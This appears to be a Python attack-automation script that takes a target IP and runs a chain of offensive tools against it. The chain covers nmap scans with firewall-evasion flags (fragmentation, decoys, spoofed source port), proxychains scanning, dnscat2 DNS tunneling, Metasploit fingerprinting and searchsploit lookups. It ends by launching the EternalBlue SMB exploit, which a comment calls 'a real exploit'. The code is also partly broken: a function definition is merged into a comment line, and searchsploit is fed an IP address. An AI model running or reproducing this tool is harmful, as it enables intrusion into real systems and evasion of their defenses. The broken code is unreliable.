import os
import platform
import sys
import subprocess
    
# Function to perform Nmap scan with optionsdef print_hacker_ascii():
  
hacker_image = """
    
    ███████╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ██╔════╝██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
    ███████╗███████║███████║██║     ███████║█████╗  ██████╔╝
    ╚════██║██╔══██║██╔══██║██║     ██╔══██║██╔══╝  ██╔══██╗
    ███████║██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    
    """
    
    print(hacker_image)

# Call the function to print the image
print_hacker_ascii()


def nmap_scan(target_ip):
    print("[*] Running Nmap Scan...")
    nmap_cmd = f"nmap -sS -T4 -f --source-port 53 -D RND {target_ip}"
    os.system(nmap_cmd)

# Function to perform a traceroute
def traceroute(target_ip):
    print("[*] Running Traceroute...")
    if platform.system() == "Windows":
        traceroute_cmd = f"tracert {target_ip}"
    else:
        traceroute_cmd = f"traceroute {target_ip}"
    os.system(traceroute_cmd)

# Function to ping the target
def ping(target_ip):
    print("[*] Pinging target...")
    if platform.system() == "Windows":
        ping_cmd = f"ping -n 4 {target_ip}"
    else:
        ping_cmd = f"ping -c 4 {target_ip}"
    os.system(ping_cmd)

# Function to run nmap scan with firewall evasion techniques
def nmap_with_firewall_evasion(target_ip):
    print("[*] Running Nmap with Firewall Evasion...")
    nmap_cmd = f"nmap -sS -f --source-port 53 -D RND {target_ip}"
    os.system(nmap_cmd)

# Function to run Nmap with ProxyChains for firewall evasion
def run_proxychains_nmap(target_ip):
    print("[*] Running Nmap with ProxyChains...")
    proxychains_cmd = f"proxychains nmap -sS {target_ip}"
    os.system(proxychains_cmd)

# Function to perform DNS Tunneling (use dnscat2 or iodine as needed)
def dns_tunneling(target_ip):
    print("[*] Running DNS Tunneling...")
    # Example for dnscat2
    dnscat2_cmd = f"dnscat2 -t {target_ip}"
    os.system(dnscat2_cmd)

# Function to run Metasploit OS detection
def metasploit_os_detection(target_ip):
    print("[*] Running Metasploit OS Detection...")
    # Metasploit's OS detection using the auxiliary/scanner/os/fingerprint module
    msf_cmd = f"msfconsole -q -x 'use auxiliary/scanner/os/fingerprint; set RHOSTS {target_ip}; run; exit'"
    os.system(msf_cmd)

# Function to search for vulnerabilities in Exploit-DB using searchsploit
def search_exploit_db(target_ip):
    print("[*] Searching Exploit Database for vulnerabilities...")
    # Use searchsploit to search for the target IP's service and version or known vulnerabilities
    search_cmd = f"searchsploit {target_ip}"
    os.system(search_cmd)

# Function to run a specific exploit (replacing the mockup with a real exploit)
def run_exploit(target_ip):
    print("[*] Attempting Exploit...")
    # Example of a real exploit (EternalBlue SMB exploit for Windows)
    msf_exploit_cmd = f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; run; exit'"
    os.system(msf_exploit_cmd)

# Main function to run all tools
def main(target_ip):
    # Step 1: Perform Nmap scan
    nmap_scan(target_ip)

    # Step 2: Perform traceroute
    traceroute(target_ip)

    # Step 3: Perform ping test
    ping(target_ip)

    # Step 4: Run Nmap with Firewall evasion techniques
    nmap_with_firewall_evasion(target_ip)

    # Step 5: Run Nmap with ProxyChains for firewall evasion
    run_proxychains_nmap(target_ip)

    # Step 6: Run DNS tunneling (optional)
    dns_tunneling(target_ip)

    # Step 7: Perform OS detection using Metasploit
    metasploit_os_detection(target_ip)

    # Step 8: Search Exploit Database for vulnerabilities related to the target
    search_exploit_db(target_ip)

    # Step 9: Attempt exploitation (optional and depends on findings)
    run_exploit(target_ip)

if __name__== "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    main(target_ip)
